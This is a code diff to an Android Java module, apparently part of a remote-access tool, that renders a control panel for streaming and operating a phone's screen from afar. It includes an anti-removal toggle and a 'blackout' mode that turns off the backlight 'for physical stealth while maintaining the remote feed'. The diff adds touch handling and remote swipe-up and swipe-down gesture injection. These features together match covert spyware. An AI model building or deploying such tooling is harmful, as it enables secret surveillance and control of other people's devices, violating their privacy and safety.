@@ -395,9 +395,9 @@ public class GhostModule extends BaseModule {
         html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
         html.append("</div></div>");
 
-        // 4. Blackout Protocol
+        // 4. Blackout Mode
         html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">BLACKOUT_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_PROTOCOL', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">BLACKOUT_MODE <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_MODE', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
         html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
         html.append("</div>");
 
@@ -436,7 +436,7 @@ public class GhostModule extends BaseModule {
         html.append("<div class=\"phone-frame\" style=\"margin-bottom: 30px; align-self: center;\">");
         html.append("<div class=\"phone-notch\"></div>");
         html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
-        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
+        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none; touch-action: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" ontouchstart=\"startGhostDrag(event)\" ontouchend=\"endGhostDrag(event)\" />");
         html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,255,0.3);\">OLED_STANDBY</div>");
         html.append("</div></div>");
         html.append("</div>");
@@ -446,6 +446,9 @@ public class GhostModule extends BaseModule {
         
         // Toggle Initiate/Terminate button (Centered below screen)
         html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn\" style=\"width: 100%; border-radius: 12px; margin: 0;\">INITIATE_VIEW</button>");
+
+        // Single Clean Swipe Up (Menu) button
+        html.append("<button onclick=\"fetch('/ghost/interact?action=swipe_up').then(()=>showToast('SWIPE_UP_DISPATCHED'))\" class=\"btn btn-small\" style=\"width: 100%; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); font-weight: bold; border-radius: 8px; margin: 0; padding: 12px; font-size: 0.75rem;\">&#9650; SWIPE UP (MENU)</button>");
 
         // Remote Typing Input group
         html.append("<div style=\"width: 100%; display: flex; flex-direction: column; gap: 10px;\">");
@@ -615,6 +618,27 @@ public class GhostModule extends BaseModule {
                     int realX = (int) (px * ghost.getScreenWidth() / 100);
                     int realY = (int) (py * ghost.getScreenHeight() / 100);
                     success = ghost.clickAt(realX, realY);
+                }
+                break;
+            case "swipe_up":
+            case "menu":
+                {
+                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
+                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                        try { ghost.performGlobalAction(14); } catch (Exception ignored) {}
+                    }
+                    int startX = sw / 2;
+                    int startY = (int) (sh * 0.85);
+                    int endY = (int) (sh * 0.20);
+                    success = ghost.swipe(startX, startY, startX, endY, 350);
+                }
+                break;
+            case "swipe_down":
+                {
+                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
+                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
+                    success = ghost.swipe(sw / 2, (int)(sh * 0.15), sw / 2, (int)(sh * 0.85), 280);
                 }
                 break;
             case "swipe":
